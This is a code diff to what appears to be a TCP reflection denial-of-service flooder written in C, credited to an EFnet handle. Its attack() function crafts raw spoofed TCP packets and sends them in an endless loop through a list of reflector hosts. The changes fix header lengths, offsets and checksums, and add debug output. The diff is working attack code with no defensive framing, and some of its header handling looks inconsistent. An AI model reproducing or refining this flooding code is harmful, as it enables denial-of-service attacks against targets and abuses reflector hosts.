@@ -64,6 +64,7 @@ By darkness@efnet (@tcphdr), greetz vae@efnet (@efnetsatan).
 #define TCP_DATA_LEN_MAX              1024          // Max TCP data length
 #define STRINGLEN                     64            // Leave it alone
 #define PHI                           0xaedc23      // Random Number Seed
+//#define DEBUG_TCP           
 
 // Variables and arrays.
 char datagram[MAX_PACKET_LEN] = { 0 };
@@ -278,14 +279,6 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
     xf_iphdr->ip_tos = 0;
     xf_tcphdr->th_urp = 0;
     xf_iphdr->ip_off = htons(0x4000);
-    xf_tcphdr->th_sum = 0;
-    xf_tcphdr->th_off = sizeof(struct tcphdr) / 4;
-
-    // Randomize TCP window
-    xf_tcphdr->th_win = htons(65535);
-
-    // Set TTL
-    xf_iphdr->ip_ttl = TCP_TTL_MAX;
 
     // Set TCP options accordingly based on what kind of reflection attack we're doing.
     // pkt 1: ack=0 seq=rand
@@ -313,25 +306,42 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
     xf_tcphdr->th_sport = htons(dstport);
 
     // Set reflector and destination address and port.
-    reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
-    reflectorPort = htons(reflectors[z].dport);
+    reflectorAddr = reflectors[z].ip4_addr.s_addr;
+    reflectorPort = reflectors[z].dport;
     xf_iphdr->ip_dst.s_addr = reflectorAddr;
     xf_tcphdr->th_dst.s_addr = reflectorAddr;
     xf_tcphdr->th_dport = reflectorPort;
     sin.sin_port = reflectorPort;
 
     // Calculate IP length
-    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
+    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp));
 
     // Calculate TCP Length
-    xf_tcphdr->th_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
+    xf_tcphdr->th_len = htons(sizeof(struct tcp));
+
+    // Calculate Offset
+    xf_tcphdr->th_off = sizeof(struct tcp) / 4;
+
+    // Randomize TCP window
+    xf_tcphdr->th_win = htons(65535);
+
+    // Set TTL
+    xf_iphdr->ip_ttl = TCP_TTL_MAX;
 
     // Calculate TCP checksum
-    xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
-    xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
+    xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
+    xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
 
     // Set start time.
     start = time(NULL);
+
+#ifdef DEBUG_TCP
+    printf("> IP HDR: %u\n", sizeof(struct ip));
+    printf("> TCP HDR: %u\n", sizeof(struct tcp));
+    printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
+#else
+    printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
+#endif
 
     while (true)
     {
@@ -344,7 +354,7 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
             z = 1, pktsent = 0;
 
         // Send the packet.
-        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr*)&sin, sizeof(sin)), packets++, pktsent++, z++;
+        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp), 0, (struct sockaddr*)&sin, sizeof(sin)), packets++, pktsent++, z++;
 
         // Set TCP options accordingly based on what kind of reflection attack we're doing.
         // pkt 1: ack=0 seq=rand
@@ -388,7 +398,7 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
             xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
         // Randomize TCP window
-        xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+       //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
 
         // Set reflector and destination address and port.
         reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
@@ -399,14 +409,23 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         sin.sin_port = reflectorPort;
 
         // Calculate IP length.
-        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
+        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp));
 
         // Calculate TCP Length
-        xf_tcphdr->th_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
+        xf_tcphdr->th_len = htons(sizeof(struct tcp));
+
+        // Calculate Offset
+        xf_tcphdr->th_off = sizeof(struct tcp) / 4;
 
         // Calculate TCP checksum
-        xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
-        xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
+        xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
+        xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
+
+#ifdef DEBUG_TCP
+        printf("> Loop IP HDR: %u\n", sizeof(struct ip));
+        printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
+        printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
+#endif
     }
 }
 
